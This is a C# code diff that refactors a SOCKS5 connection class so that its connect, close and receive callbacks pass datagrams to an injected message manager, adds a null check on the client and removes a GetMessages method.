@@ -1,4 +1,5 @@
-﻿using Agent.Models;
+﻿using Agent.Interfaces;
+using Agent.Models;
 using System.Collections.Concurrent;
 
 namespace Agent
@@ -10,9 +11,11 @@ namespace Agent
         public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
         private ConcurrentBag<ServerDatagram> messages = new ConcurrentBag<ServerDatagram>();
         public bool exited;
+        private IMessageManager messageManager { get; set; }
 
-        public ConnectionConfig(ConnectionOptions co)
+        public ConnectionConfig(ConnectionOptions co, IMessageManager messageManager)
         {
+            this.messageManager = messageManager;
             client = new AsyncTcpClient(co)
             {
                 ConnectedCallback = async (client, isReconnected) =>
@@ -28,13 +31,13 @@ namespace Agent
                      }.ToByte(),
                      IsConnected() ? false : true
                     );
-                    messages.Add(smOut);
+                    messageManager.AddResponse(DatagramSource.Socks5, smOut);
                     onSocksEvent.Set();
                 },
                 ClosedCallback = async (client, closedByRemote) =>
                 {
                     onSocksEvent.Set();
-                    messages.Add(new ServerDatagram(server_id, new byte[] { }, true));
+                    messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(server_id, new byte[] { }, true));
                     exited = true;
                 },
                 ReceivedCallback = async (client, count) =>
@@ -42,8 +45,11 @@ namespace Agent
                     byte[] buf;
                     if (count > 0)
                     {
-                        buf = this.client.ByteBuffer.Dequeue(count);
-                        messages.Add(new ServerDatagram(server_id, buf, IsConnected() ? false : true));
+                        if(this.client is not null)
+                        {
+                            buf = this.client.ByteBuffer.Dequeue(count);
+                            messageManager.AddResponse(DatagramSource.Socks5, new ServerDatagram(server_id, buf, IsConnected() ? false : true));
+                        }
                     }
                 }
             };
@@ -61,23 +67,6 @@ namespace Agent
             {
                 return false;
             }
-        }
-
-        public List<ServerDatagram> GetMessages()
-        {
-            List<ServerDatagram> msgs = new List<ServerDatagram>(messages);
-            messages.Clear();
-
-            if (exited)
-            {
-                msgs.Prepend(new ServerDatagram(server_id, new byte[] { }, true));
-            }
-
-            foreach (var msg in msgs)
-            {
-                msg.PrepareMessage();
-            }
-            return msgs;
         }
     }
 }
